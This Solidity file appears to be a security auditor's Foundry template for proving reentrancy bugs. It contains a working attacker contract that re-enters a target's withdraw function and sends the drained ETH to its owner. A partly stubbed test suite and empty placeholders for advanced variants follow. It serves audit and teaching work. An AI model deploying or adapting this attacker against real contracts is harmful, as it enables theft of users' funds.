// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

/**
 * @title Reentrancy Proof of Concept
 * @notice Template for exploiting reentrancy vulnerabilities
 * @author Volodymyr Stetsenko (Zero2Auditor)
 * 
 * @dev This template demonstrates a classic reentrancy attack pattern.
 * Adapt the target contract interface and attack logic for specific cases.
 * 
 * Common reentrancy patterns:
 * 1. Single-function reentrancy (same function)
 * 2. Cross-function reentrancy (different functions)
 * 3. Cross-contract reentrancy (multiple contracts)
 * 4. Read-only reentrancy (view function exploitation)
 */

// Interface for vulnerable contract
interface IVulnerableContract {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function getBalance(address user) external view returns (uint256);
}

/**
 * @title Reentrancy Attacker Contract
 */
contract ReentrancyAttacker {
    IVulnerableContract public target;
    address public owner;
    uint256 public attackAmount;
    uint256 public reentryCount;
    uint256 public maxReentries = 3;
    
    event AttackInitiated(uint256 amount);
    event ReentryExecuted(uint256 count, uint256 balance);
    event AttackCompleted(uint256 stolen);
    
    constructor(address _target) {
        target = IVulnerableContract(_target);
        owner = msg.sender;
    }
    
    /**
     * @notice Fallback function - triggers reentrancy
     */
    receive() external payable {
        console.log("Fallback triggered, reentry count:", reentryCount);
        console.log("Target balance:", address(target).balance);
        
        // Continue reentrancy if conditions met
        if (reentryCount < maxReentries && address(target).balance >= attackAmount) {
            reentryCount++;
            emit ReentryExecuted(reentryCount, address(target).balance);
            target.withdraw(attackAmount);
        }
    }
    
    /**
     * @notice Execute the reentrancy attack
     */
    function attack() external payable {
        require(msg.value > 0, "Need ETH to attack");
        attackAmount = msg.value;
        reentryCount = 0;
        
        emit AttackInitiated(attackAmount);
        
        // Step 1: Deposit to become eligible for withdrawal
        target.deposit{value: attackAmount}();
        
        // Step 2: Trigger reentrancy via withdraw
        target.withdraw(attackAmount);
        
        // Step 3: Transfer stolen funds to attacker
        uint256 stolen = address(this).balance;
        emit AttackCompleted(stolen);
        payable(owner).transfer(stolen);
    }
    
    /**
     * @notice Emergency withdrawal
     */
    function emergencyWithdraw() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}

/**
 * @title Reentrancy PoC Test Suite
 */
contract ReentrancyPoCTest is Test {
    IVulnerableContract public vulnerableContract;
    ReentrancyAttacker public attacker;
    
    address public victim = address(0x1234);
    address public attackerEOA = address(0x1337);
    
    function setUp() public {
        // TODO: Deploy vulnerable contract
        // vulnerableContract = new VulnerableContract();
        
        // Deploy attacker contract
        // attacker = new ReentrancyAttacker(address(vulnerableContract));
        
        // Fund accounts
        vm.deal(victim, 10 ether);
        vm.deal(attackerEOA, 5 ether);
    }
    
    /**
     * @notice Test reentrancy attack
     */
    function test_reentrancy_exploit() public {
        // Setup: Victim deposits funds
        vm.startPrank(victim);
        // vulnerableContract.deposit{value: 5 ether}();
        vm.stopPrank();
        
        // Record initial balances
        // uint256 contractBalanceBefore = address(vulnerableContract).balance;
        uint256 attackerBalanceBefore = attackerEOA.balance;
        
        // Execute attack
        vm.startPrank(attackerEOA);
        // attacker.attack{value: 1 ether}();
        vm.stopPrank();
        
        // Verify attack success
        uint256 attackerBalanceAfter = attackerEOA.balance;
        // uint256 contractBalanceAfter = address(vulnerableContract).balance;
        
        // Attacker should have more ETH than they started with
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attack failed");
        
        // Contract should be drained
        // assertLt(contractBalanceAfter, contractBalanceBefore, "Contract not drained");
        
        console.log("Attack successful!");
        console.log("Attacker profit:", attackerBalanceAfter - attackerBalanceBefore);
    }
    
    /**
     * @notice Test cross-function reentrancy
     */
    function test_cross_function_reentrancy() public {
        // TODO: Implement cross-function reentrancy test
        // This exploits reentrancy across different functions
    }
    
    /**
     * @notice Test read-only reentrancy
     */
    function test_readonly_reentrancy() public {
        // TODO: Implement read-only reentrancy test
        // This exploits view functions during reentrancy
    }
}

/**
 * @title Advanced Reentrancy Patterns
 */
contract AdvancedReentrancyAttacker {
    /**
     * @notice Cross-contract reentrancy
     * @dev Exploits reentrancy across multiple contracts
     */
    function crossContractAttack(address target1, address target2) external {
        // TODO: Implement cross-contract reentrancy
    }
    
    /**
     * @notice Delegatecall reentrancy
     * @dev Combines delegatecall with reentrancy
     */
    function delegatecallReentrancy(address target) external {
        // TODO: Implement delegatecall reentrancy
    }
    
    /**
     * @notice ERC777 token reentrancy
     * @dev Exploits ERC777 hooks for reentrancy
     */
    function erc777Reentrancy(address token, address target) external {
        // TODO: Implement ERC777 reentrancy
    }
}

